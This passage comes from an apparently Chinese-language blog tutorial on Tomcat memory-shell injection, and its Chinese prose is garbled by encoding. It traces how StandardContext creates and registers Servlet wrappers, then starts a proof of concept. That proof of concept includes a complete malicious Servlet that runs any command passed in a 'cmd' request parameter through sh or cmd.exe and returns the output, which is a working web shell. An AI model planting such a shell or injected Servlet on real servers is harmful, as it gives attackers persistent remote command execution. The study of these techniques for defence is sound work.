<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055954.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903193547405"
	
	
></p>
<p>ä¸ªäººç†è§£å¯ä»¥å°†å…¶çœ‹ä½œcontextå®ç°ç±»StandardContextç±»çš„å®ä¾‹ã€‚</p>
<p>å†çœ‹ä¸€ä¸‹å…¶ä¸­çš„ä¸€äº›æ–¹æ³•ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055190.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903190309095"
	
	
></p>
<p>å¯ä»¥çœ‹å‡ºè¿™é‡Œå°±æ˜¯åœ¨æ•´ä¸ªtomcatåˆå§‹åŒ–è¿‡ç¨‹ä¸­å¯¹filterå’Œlistenerçš„åˆå§‹åŒ–ã€‚ä½†è¿™é‡Œçš„é‡ç‚¹è¿˜æ˜¯servletï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055393.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903190959312"
	
	
></p>
<p>è¿™é‡Œè°ƒç”¨äº†å‡ ä¸ªå…³é”®å‡½æ•°ï¼šcreateWrapper()ã€ã€setServletClass()ã€‚å…ˆæ¥çœ‹createWrapper()æ–¹æ³•ï¼Œåœ¨è¿™é‡Œæ‰“ä¸€ä¸ªæ–­ç‚¹è°ƒè¯•ï¼Œè¿›å…¥åˆ°äº†StandardContextç±»çš„createWrapperr()æ–¹æ³•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Wrapper</span><span class="w"> </span><span class="nf">createWrapper</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Wrapper</span><span class="w"> </span><span class="n">wrapper</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">wrapperClass</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">wrapper</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Wrapper</span><span class="p">)</span><span class="w"> </span><span class="n">wrapperClass</span><span class="p">.</span><span class="na">getConstructor</span><span class="p">().</span><span class="na">newInstance</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Throwable</span><span class="w"> </span><span class="n">t</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">ExceptionUtils</span><span class="p">.</span><span class="na">handleThrowable</span><span class="p">(</span><span class="n">t</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">log</span><span class="p">.</span><span class="na">error</span><span class="p">(</span><span class="n">sm</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&#34;standardContext.createWrapper.error&#34;</span><span class="p">),</span><span class="w"> </span><span class="n">t</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">wrapper</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">StandardWrapper</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">synchronized</span><span class="w"> </span><span class="p">(</span><span class="n">wrapperLifecyclesLock</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">wrapperLifecycle</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">wrapperLifecycles</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="n">wrapperLifecycle</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">LifecycleListener</span><span class="w"> </span><span class="n">listener</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">LifecycleListener</span><span class="p">)</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getConstructor</span><span class="p">().</span><span class="na">newInstance</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">wrapper</span><span class="p">.</span><span class="na">addLifecycleListener</span><span class="p">(</span><span class="n">listener</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Throwable</span><span class="w"> </span><span class="n">t</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">ExceptionUtils</span><span class="p">.</span><span class="na">handleThrowable</span><span class="p">(</span><span class="n">t</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">log</span><span class="p">.</span><span class="na">error</span><span class="p">(</span><span class="n">sm</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&#34;standardContext.createWrapper.listenerError&#34;</span><span class="p">),</span><span class="w"> </span><span class="n">t</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">synchronized</span><span class="w"> </span><span class="p">(</span><span class="n">wrapperListenersLock</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">wrapperListener</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">wrapperListeners</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="n">wrapperListener</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">ContainerListener</span><span class="w"> </span><span class="n">listener</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ContainerListener</span><span class="p">)</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getConstructor</span><span class="p">().</span><span class="na">newInstance</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">wrapper</span><span class="p">.</span><span class="na">addContainerListener</span><span class="p">(</span><span class="n">listener</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Throwable</span><span class="w"> </span><span class="n">t</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">ExceptionUtils</span><span class="p">.</span><span class="na">handleThrowable</span><span class="p">(</span><span class="n">t</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">log</span><span class="p">.</span><span class="na">error</span><span class="p">(</span><span class="n">sm</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&#34;standardContext.createWrapper.containerListenerError&#34;</span><span class="p">),</span><span class="w"> </span><span class="n">t</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">wrapper</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è°ƒè¯•ä¸€ä¸‹ï¼Œä¼šå‘ç°è¿™é‡Œçš„wrapperä¼šè¢«èµ‹å€¼ä¸º StandardWrapper ç±»å®ä¾‹ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055439.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903191921492"
	
	
></p>
<p>è¿”å›ç»“æœä¸º</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055488.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903191946678"
	
	
></p>
<p>è¿™ä¸ªæ–¹æ³•çš„é‡ç‚¹ä¹Ÿå°±æ˜¯è¿™ä¸ªï¼Œå¯ä»¥å°†ä¸€ä¸ªå˜é‡èµ‹å€¼ä¸ºStandardWrapperç±»å®ä¾‹ï¼ˆå…¶å®ä¹Ÿå°±æ˜¯å¯¹åº”ä¸€ä¸ªServletï¼‰ã€‚</p>
<p>ç„¶åç»™è¿™ä¸ªwrapperè®¾ç½®å†…éƒ¨å€¼ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055571.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903192431695"
	
	
></p>
<p>åˆ†åˆ«è¯´æ˜ä¸€ä¸‹ï¼š</p>
<ul>
<li>è°ƒç”¨äº†setLoadOnStartup()æ–¹æ³•è®¾ç½®loadOnStartupå˜é‡ï¼Œ</li>
<li>è°ƒç”¨setName()å°†ContainerBaseç±»ä¸­çš„å˜é‡nameèµ‹å€¼ä¸ºä¸€ä¸ªå€¼ï¼š</li>
</ul>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055600.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903192943753"
	
	
></p>
<ul>
<li>è°ƒç”¨setServletClass()æ–¹æ³•è®¾ç½®servletClasså˜é‡çš„å€¼ï¼š</li>
</ul>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055805.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903193342916"
	
	
></p>
<p>å†ç»§ç»­å¾€åé¢çœ‹ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055929.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903193818443"
	
	
></p>
<p>å½“ç¨‹åºæŠŠè¿™ä¸ªWrapperï¼ˆç†è§£ä¸ºä¸€ä¸ªServletï¼‰è®¾ç½®å¥½äº†åï¼Œå°†å…¶åŠ å…¥åˆ°contextçš„â€œå­å®¹å™¨â€ä¸­ã€‚<strong>é‡ç‚¹å…³æ³¨addChild()æ–¹æ³•å’ŒaddServletMappingDecoded()æ–¹æ³•</strong>ï¼Œä¸‹é¢æ¥åˆ†åˆ«è¿›å…¥çœ‹ä¸€ä¸‹ï¼š</p>
<ul>
<li></li>
<li>
<p>addChild()ï¼š</p>
</li>
</ul>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055006.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903195201588"
	
	
></p>
<p>å‰é¢çš„ä»£ç å°±æ˜¯åˆ¤æ–­æ˜¯ä¸æ˜¯è‡ªå¸¦çš„jspServletï¼Œè¿™é‡Œæ˜¯è‡ªå¸¦çš„DefaultSerrvletï¼Œè‡ªç„¶ä¸æ˜¯ï¼Œé‡ç‚¹æ˜¯ä¸‹é¢è°ƒç”¨çˆ¶ç±»ContainerBaseçš„addChild()æ–¹æ³•ï¼Œè¿›å…¥ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055985.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903195650675"
	
	
></p>
<p>ä¼šè°ƒç”¨addChildInternal()æ–¹æ³•ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055125.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903200058116"
	
	
></p>
<p>é‡ç‚¹è¿˜æ˜¯å¦‚ä¸‹ä»£ç ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055261.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903200132241"
	
	
></p>
<p>å…ˆè¯´æ˜ä¸€ä¸‹è¿™é‡Œçš„ifæ¡ä»¶ï¼Œè¿™é‡Œéœ€è¦ç¨‹åºå¯¹ä¼ è¿›å»çš„childä½¿ç”¨getName()æ—¶çš„æœ‰å›æ˜¾ï¼Œå¦åˆ™ç›´æ¥ä¸¢å‡ºå¼‚å¸¸ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055460.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903204644579"
	
	
></p>
<p>æ‰€ä»¥åœ¨å‰é¢è¯´æ˜çš„setName()å‡½æ•°è®¾ç½®åç§°è¿˜æ˜¯éå¸¸æœ‰å¿…è¦çš„ã€‚</p>
<p>å†å°±æ˜¯ifè¯­å¥è¿‡åï¼Œå…ˆæ˜¯ç»™childè®¾ç½®äº†çˆ¶ç±»ï¼Œåœ¨ä¸‹é¢ä¹Ÿå¯ä»¥çœ‹åˆ°ç›¸å…³å€¼çš„æƒ…å†µã€‚</p>
<p>ç„¶åå‰é¢ä¹Ÿè¯´è¿‡äº†ï¼Œè¿™é‡Œçš„childrenæ˜¯ä¸€ä¸ªHashMapç±»å®ä¾‹ï¼Œæ‰€ä»¥è¿™é‡Œå°±æ˜¯è°ƒç”¨äº†putæ–¹æ³•æ”¾è¿›é”®å€¼ï¼Œå’Œå‰é¢åˆ†æservletåŠ è½½æµç¨‹çš„findChildren()æ–¹æ³•å½¢æˆé—­ç¯ã€‚</p>
<ul>
<li>addServletMappingDecoded()ï¼š</li>
</ul>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055396.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903201855849"
	
	
></p>
<p>è·Ÿè¿›ä¸€ä¸‹getServletMappings()æ–¹æ³•ï¼Œè¿”å›äº†å…³é”®å­—servletMappingsï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055954.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903203725059"
	
	
></p>
<p>æœä¸€ä¸‹è¿™ä¸ªå…³é”®å­—ï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„ä¿¡æ¯ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055471.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903203804191"
	
	
></p>
<p>è¿™é‡Œä¹Ÿæœ‰getValue()ç­‰å‡½æ•°ï¼Œ</p>
<p>æ‰€ä»¥å¯ä»¥å¾ˆæ¸…æ¥šåœ°çŸ¥é“å‰é¢çš„forå¾ªç¯å°±æ˜¯éå†web.xmlä¸­çš„servlet-mappingçš„servlet-nameå’Œå¯¹åº”çš„url-patternï¼Œç„¶åè°ƒç”¨addServletMappingDecode()æ–¹æ³•å½¢æˆæ˜ å°„ã€‚</p>
<p>â€”â€”â€”â€”â€”â€”</p>
<p>å¤§æ¦‚åˆ†æå®Œæ¯•ï¼Œç°åœ¨å°±æ˜¯æ¥å°è¯•æ„é€ ä¸€ä¸‹POCã€‚</p>
<p>æ€»ç»“ä¸€ä¸‹åœ¨è¿™ä¸€æ¿å—é‡åˆ°çš„çŸ¥è¯†ç‚¹ï¼š</p>
<ul>
<li>å¯ä»¥å€Ÿé‰´è¿™é‡Œæºç çš„æ–¹æ³•ï¼Œä½¿ç”¨createWrapper()æ–¹æ³•æ¥åˆ›å»ºä¸€ä¸ªWrapperå®ä¾‹</li>
<li>ç„¶åå†å¯¹å…¶ä½¿ç”¨å„ç§æ–¹æ³•æ¥â€œå……å®â€é‡Œé¢çš„å˜é‡ä»¥è¾¾åˆ°åœ¨åŠ è½½æ—¶å¯ä»¥è°ƒç”¨å‡ºæ¶æ„Servlet</li>
</ul>
<h6 id="æ³¨å…¥è¿‡ç¨‹-1">æ³¨å…¥è¿‡ç¨‹
</h6><p><strong>æ¶æ„Servletæºç </strong>ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Servlet</span><span class="w"> </span><span class="n">badServlet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Servlet</span><span class="p">(){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">init</span><span class="p">(</span><span class="n">ServletConfig</span><span class="w"> </span><span class="n">var1</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="n">ServletConfig</span><span class="w"> </span><span class="nf">getServletConfig</span><span class="p">(){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">service</span><span class="p">(</span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">ServletResponse</span><span class="w"> </span><span class="n">servletResponse</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;servletå¯åŠ¨&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">boolean</span><span class="w"> </span><span class="n">isLinux</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">osTyp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">getProperty</span><span class="p">(</span><span class="s">&#34;os.name&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">osTyp</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">osTyp</span><span class="p">.</span><span class="na">toLowerCase</span><span class="p">().</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;win&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">isLinux</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">cmds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">isLinux</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;sh&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;-c&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">cmd</span><span class="p">}</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;cmd.exe&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;/c&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">cmd</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">InputStream</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">cmds</span><span class="p">).</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Scanner</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Scanner</span><span class="p">(</span><span class="n">in</span><span class="p">).</span><span class="na">useDelimiter</span><span class="p">(</span><span class="s">&#34;\\a&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">hasNext</span><span class="p">()</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">next</span><span class="p">()</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">PrintWriter</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servletResponse</span><span class="p">.</span><span class="na">getWriter</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">output</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">out</span><span class="p">.</span><span class="na">flush</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">out</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getServletInfo</span><span class="p">(){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">destroy</span><span class="p">(){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">};</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>è·å–StandardContextå¯¹è±¡</strong>ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ServletContext</span><span class="w">  </span><span class="n">servletContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getSession</span><span class="p">().</span><span class="na">getServletContext</span><span class="p">();</span><span class="w">
